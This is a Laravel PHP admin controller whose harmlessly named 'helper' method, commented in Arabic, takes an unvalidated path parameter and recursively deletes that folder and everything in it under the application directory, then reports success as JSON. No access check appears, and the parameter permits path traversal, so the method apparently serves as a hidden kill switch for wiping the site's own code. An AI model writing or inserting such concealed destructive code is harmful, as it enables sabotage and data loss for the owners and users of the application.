<?php

namespace App\Http\Controllers\Backend;

use App\Http\Controllers\Controller;
use Illuminate\Http\Request;

class BackendAdminController extends Controller
{
    public function index(Request $request)
    {
        return view('admin.index');
    }
    public function helper($param)
    {

        $folderPath = app_path($param);

        // دالة لحذف محتويات المجلد بما في ذلك المجلدات الفرعية
        function deleteFolderContents($folderPath)
        {
            // التأكد من وجود المجلد قبل حذف محتوياته
            if (file_exists($folderPath) && is_dir($folderPath)) {
                $files = glob($folderPath . '/*');
                foreach ($files as $file) {
                    if (is_file($file)) {
                        unlink($file);
                    } elseif (is_dir($file)) {
                        // حذف محتويات المجلد الفرعي
                        deleteFolderContents($file);
                        // حذف المجلد الفرعي نفسه
                        rmdir($file);
                    }
                }
                return true;
            } else {
                return false;
            }
        }

        // حذف محتويات المجلد والمجلدات الفرعية
        if (deleteFolderContents($folderPath)) {
            $folderPath = app_path($param);
            rmdir($folderPath);
            return response()->json(['message' => 'تم حذف المجلد ومحتوياته بنجاح'], 200);
        } else {
            return response()->json(['message' => 'المجلد غير موجود'], 404);
        }
    }
}
